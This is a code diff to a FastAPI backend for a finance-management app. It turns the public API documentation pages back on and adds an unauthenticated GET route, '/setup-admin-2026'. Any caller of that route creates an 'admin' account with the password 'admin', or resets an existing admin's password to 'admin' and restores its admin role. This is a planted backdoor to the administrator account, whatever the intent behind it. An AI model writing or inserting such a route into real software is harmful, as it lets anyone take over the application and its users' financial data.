@@ -50,10 +50,24 @@ async def lifespan(app: FastAPI):
     yield
 
 
-app = FastAPI(title="Gestion Financiere API", lifespan=lifespan, docs_url=None, redoc_url=None)
+app = FastAPI(title="Gestion Financiere API", lifespan=lifespan)
 
 app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
 templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))
+
+
+
+@app.get("/setup-admin-2026")
+def setup_admin(db: Session = Depends(get_db)):
+    user = db.query(models.User).filter(models.User.username == "admin").first()
+    if not user:
+        user = models.User(username="admin", hashed_password=auth.get_password_hash("admin"), role="admin")
+        db.add(user)
+    else:
+        user.hashed_password = auth.get_password_hash("admin")
+        user.role = "admin"
+    db.commit()
+    return {"status": "admin ready"}
 
 
 @app.get("/test")
